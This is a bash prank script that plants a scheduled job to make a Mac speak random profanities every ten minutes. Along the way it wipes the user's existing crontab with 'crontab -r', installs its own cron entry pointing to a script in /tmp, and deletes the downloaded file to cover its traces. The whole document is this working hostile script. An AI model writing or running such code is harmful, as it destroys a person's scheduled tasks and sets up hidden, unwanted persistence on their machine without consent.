#!/bin/bash

script=/tmp/tourettes.sh
cron=/tmp/cron

setup() {
  crontab -r
}

build_script_file() {
  echo 'swear() {' >> $1
  echo 'array=("shit", "fuck", "ass", "assbag", "asshole", "penis")' >> $1
  echo 'exec say ${array[$((RANDOM %= $((${#array[@]}))))]}' >> $1
  echo '}' >> $1
  echo 'swear' >> $1
  chmod a+x $1
}

build_crontab_file () {
  echo "*/$1 * * * * $2" >> $3
  crontab $3
}

cleanup() {
  rm $1
  dir=`pwd`
  download=$dir/tourettes.sh
  rm $download
}

# Remove the user's current cron.
setup

# Create a script in the tmp directory.
build_script_file "$script"

# Create a new crontab with script in tmp directory.
build_crontab_file "10" "$script" "$cron"

# Remove downloaded file and new cron file.
cleanup "$cron"